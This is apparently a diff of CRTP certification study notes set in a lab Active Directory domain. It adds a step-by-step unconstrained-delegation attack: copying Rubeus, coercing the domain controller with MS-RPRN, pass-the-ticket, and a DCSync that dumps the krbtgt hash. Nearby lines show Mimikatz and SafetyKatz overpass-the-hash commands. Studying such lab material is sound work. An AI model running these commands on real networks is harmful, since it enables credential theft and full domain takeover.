@@ -1797,7 +1797,7 @@ opth: you are using NTLM or AES. we create a request or ticket from the DC.
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
-sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe
+C:\AD\Tools\Loader.exe -Path C:\AD\tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
 OR
 Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows/System32\cmd.exe /show /ptt
 winrs -r:scorp-dc cmd   #use winrs to interact with DC with svcadmin user
@@ -2095,10 +2095,6 @@ Get-Netcomputer -UnConstrained | select samaccountname
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/92da62fa-7cae-4a99-bdae-ccdf0facf993)
 
-another way to know if the user has unconstrained delegation is by checking the useraccountcontrol after running `"Get-Domaincomputer -Unconstrained"`
-
-![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cc85c9b1-24ea-422c-a882-1ac7b5b44ce0)
-
 Two devices have unconstrained delegation feature. The first one is DC which always having UnConstained Delegation in it so we will ignore it
 
 we will focus on dcopr-appsrv. to apply the attack you must be hacked the machine and have the local admin privilege 
@@ -2139,3 +2135,39 @@ now you can explore DC files and run some commands OR you can perform DCSync att
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a1b480db-c2a1-4cb5-985e-395c337dea3c)
 
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/56bf212c-932b-42d1-aab8-26b89f15ee13)
+
+#OR if the above didn't work
+check if the user has unconstrained delegation is by checking the useraccountcontrol after running `"Get-Domaincomputer -Unconstrained"`
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cc85c9b1-24ea-422c-a882-1ac7b5b44ce0)
+
+you need to force the DC to connect to the appsrv. to do that we need to compromise the appsrv first
+
+1. check if we have admin access on appsrv
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cb59fee8-0856-423f-8d7b-910a7b02f638)
+
+2. copy Rubeus.exe to appsrv machine
+```
+echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/52f771a5-12b3-4865-9184-f20b5db8f7ff)
+3. run Rubeus.exe in monitor mode to get the TGT ticket
+```
+Rubeus.exe monitor /interval:5 /targetuser:dcorp-dc$ /nowrap
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/6ce74a3e-e6e2-460b-b546-a5efa9f17bdb)
+
+4. force the DC to connect to appsrv
+```
+C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
+if you get `"Error Code 1722 -  The RPC server is unavailable"` it is fine
+5. you will get the base64TGT of the DC
+6. perform pass the ticket attack 
+```
+Rubeus.exe ptt /ticket:<base64TGT of the DC>
+```
+7. run DCSync attack to get the NTLM hash of the DC
+```
+SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
